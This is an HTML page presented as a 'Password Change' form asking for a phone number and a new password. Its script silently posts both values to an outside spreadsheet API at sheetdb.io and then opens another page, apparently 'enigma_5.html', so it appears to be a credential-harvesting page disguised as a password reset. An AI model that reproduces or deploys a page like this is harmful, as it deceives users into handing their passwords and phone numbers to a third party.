<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Change</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .password-form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }.body::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            background: url("https://i.pinimg.com/originals/23/3d/3f/233d3f263196f2e0124618d995e3af48.jpg"), #000;/insert image/
            background-position: center;
            background-size: cover;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        button {
            background-color: #4caf50;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        .remember-password {
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="password-form">
    <form action="https://sheetdb.io/api/v1/9lzmjgly6qgxy" method="post" id="sheetdb-form"">
        <div class="form-group">
            <label for="phone-number">Phone Number:</label>
            <input type="text" id="phone-number" name="data[phone]" required>
        </div>

        <div class="form-group">
            <label for="new-password">New Password:</label>
            <input type="password" id="new-password" name="data[password ]" required>
        </div>

        <div class="form-group">
            <label for="confirm-password">Confirm Password:</label>
            <input type="password" id="confirm-password" name="confirm-password" required>
        </div>

        <div class="remember-password">
            <label>
                <input type="checkbox" name="remember-password"> Remember Password
            </label>
        </div>

        <button type="submit">Change Password</button>
    </form>
    <script>
        var form = document.getElementById('sheetdb-form');
     form.addEventListener("submit", e => {
      e.preventDefault();
      fetch(form.action, {
          method : "POST",
          body: new FormData(document.getElementById("sheetdb-form")),
      }).then(
          response => response.json()
      ).then((html) => {
        // you can put any JS code here
        window.open('enigma_5.html','_blank');

      });
    });
      </script>
</div>
</body>
</html>
